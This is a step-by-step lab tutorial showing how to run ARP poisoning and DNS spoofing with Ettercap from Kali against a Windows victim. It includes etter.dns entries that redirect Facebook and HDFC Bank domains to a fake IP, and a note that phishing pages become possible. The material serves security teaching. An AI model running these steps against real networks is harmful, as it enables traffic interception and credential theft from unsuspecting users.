# ğŸš© **Practical: ARP Poisoning & DNS Spoofing using Ettercap**

## ğŸ“Œ **Goal**

- **ARP Poisoning:** Trick the victim and gateway into sending traffic through your machine.
- **DNS Spoofing:** Redirect domain requests to a fake IP.

This demonstrates **Man-in-the-Middle (MITM)** concepts for labs.

---

## ğŸ› ï¸ **Tools Used**

- **Ettercap** â€” GUI & CLI MITM framework.
- **Windows** machine (victim).
- **Kali Linux** machine (attacker).

---

## ğŸ”¹ **STEP 1 â€” Verify Victim IP & ARP Table**

ğŸ‘‰ **On Windows (Victim):**

Open **CMD**:

```bash
ipconfig /all
arp -a
```

âœ”ï¸ Note:

- **IP address** of victim.
- **Gateway IP**.
- **ARP table** should show gatewayâ€™s MAC.

---

## ğŸ”¹ **STEP 2 â€” Start Ettercap GUI on Kali**

```bash
sudo ettercap -G
```

âœ… `-G` â†’ Starts Ettercap in **Graphical mode**.

---

## ğŸ”¹ **STEP 3 â€” Locate `etter.dns` File**

Ettercap uses a DNS spoof config file:

```bash
sudo find / -name etter.dns
```

âœ… Typically: `/etc/ettercap/etter.dns`

---

## ğŸ”¹ **STEP 4 â€” Edit DNS Spoofing File**

```bash
cd /etc/ettercap
sudo nano etter.dns
```

**Add fake DNS entries** at the bottom:

```
www.facebook.com   A   196.1.1.172
www.hdfcbank.com   A   196.1.1.172
www.micromax.in    A   196.1.1.172

196.1.1.172   PTR   www.facebook.com
```

âœ”ï¸ This means:

- Any request for `www.facebook.com` resolves to `196.1.1.172`.

âœ… Save: `Ctrl+O` â†’ `Enter` â†’ `Ctrl+X`.

---

## ğŸ”¹ **STEP 5 â€” Prepare MITM in Ettercap GUI**

1ï¸âƒ£ In Ettercap GUI:

- **Sniff â†’ Unified Sniffing â†’ Select Interface** (e.g., `eth0`).

2ï¸âƒ£ **Scan for hosts:**

- `Hosts â†’ Scan for hosts`.

3ï¸âƒ£ View found hosts:

- `Hosts â†’ Host List`.

4ï¸âƒ£ **Add targets:**

- Select victim IP â†’ `Add to Target 1`.
- Select gateway IP â†’ `Add to Target 2`.

---

## ğŸ”¹ **STEP 6 â€” Load DNS Spoof Plugin**

1ï¸âƒ£ Plugins â†’ **Manage Plugins**
2ï¸âƒ£ Double-click `dns_spoof` â†’ should show **\[X]** (enabled).

---

## ğŸ”¹ **STEP 7 â€” Launch ARP Poisoning Attack**

In Ettercap GUI:

```
Mitm â†’ ARP Poisoning
âœ”ï¸ Sniff remote connections â†’ OK
```

---

## ğŸ”¹ **STEP 8 â€” Verify ARP Table**

ğŸ‘‰ **On Windows (Victim):**

```bash
arp -a
```

âœ… The **gateway MAC** should now point to attackerâ€™s MAC â†’ shows ARP table is poisoned.

---

## ğŸ”¹ **STEP 9 â€” Test DNS Spoofing**

ğŸ‘‰ **On Windows (Victim):**

```bash
nslookup www.facebook.com
```

âœ… The IP should resolve to: `196.1.1.172`.

Open browser â†’ `www.facebook.com` â†’ it will attempt to load from fake IP.

---

## âœ… **How It Works**

1ï¸âƒ£ Ettercap **spoofs ARP replies** so victim sends packets to attacker.
2ï¸âƒ£ DNS requests to `facebook.com` go through attacker.
3ï¸âƒ£ **Ettercap DNS plugin** replies with fake IP (`196.1.1.172`).
4ï¸âƒ£ Victimâ€™s browser connects to wrong IP â†’ _MITM or phishing page possible_.

---

## âœ… **Practical Flow**

| Step               | Command/Action                  |
| ------------------ | ------------------------------- |
| Check IP & ARP     | `ipconfig /all` + `arp -a`      |
| Start Ettercap GUI | `sudo ettercap -G`              |
| Find `etter.dns`   | `sudo find / -name etter.dns`   |
| Edit DNS entries   | `sudo nano etter.dns`           |
| Unified Sniffing   | Select interface (eth0)         |
| Scan hosts         | `Hosts â†’ Scan for hosts`        |
| Add targets        | Host List â†’ Add to Target 1 & 2 |
| Load plugin        | `Plugins â†’ dns_spoof`           |
| Start ARP MITM     | `Mitm â†’ ARP Poisoning`          |
| Verify ARP         | `arp -a`                        |
| Verify DNS spoof   | `nslookup www.facebook.com`     |

---
